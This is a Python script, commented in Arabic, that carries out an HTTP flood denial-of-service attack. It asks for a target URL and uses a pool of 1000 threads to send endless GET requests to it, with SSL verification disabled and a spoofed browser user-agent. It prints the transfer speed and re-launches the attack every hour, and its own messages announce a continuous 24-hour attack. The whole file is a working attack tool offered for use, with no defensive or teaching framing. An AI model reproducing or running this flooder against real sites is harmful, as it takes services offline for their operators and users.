import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

def attack(url):
    global bytes_transferred
    while True:
        try:
            response = session.get(url, headers=headers)
            with lock:
                bytes_transferred += len(response.content)
            print("تم إرسال الطلب إلى:", url)
        except Exception as e:
            print("حدث خطأ:", e)

def start_attack(url):
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for _ in range(5000):  # عدد أقل من المهام لتحسين الأداء والتجنب من استهلاك الموارد الزائدة
            executor.submit(attack, url)

    # الطلب الأولي خارج الهجمات
    try:
        response = session.get(url, headers=headers)
        print(response.text)
    except Exception as e:
        print("حدث خطأ أثناء الطلب الأولي:", e)

def calculate_speed():
    global bytes_transferred
    while True:
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)  # تحويل البايتات إلى ميجابايت
            bytes_transferred = 0
        print(f"سرعة النقل: {speed:.2f} MB/s")

url = input("أدخل رابط الهدف: ")

print("بدء الهجوم بشكل مستمر على مدار 24 ساعة")

# بدء خيط حساب السرعة
speed_thread = threading.Thread(target=calculate_speed)
speed_thread.daemon = True
speed_thread.start()

while True:
    start_attack(url)
    time.sleep(3600)  # انتظار ساعة قبل تكرار الهجوم
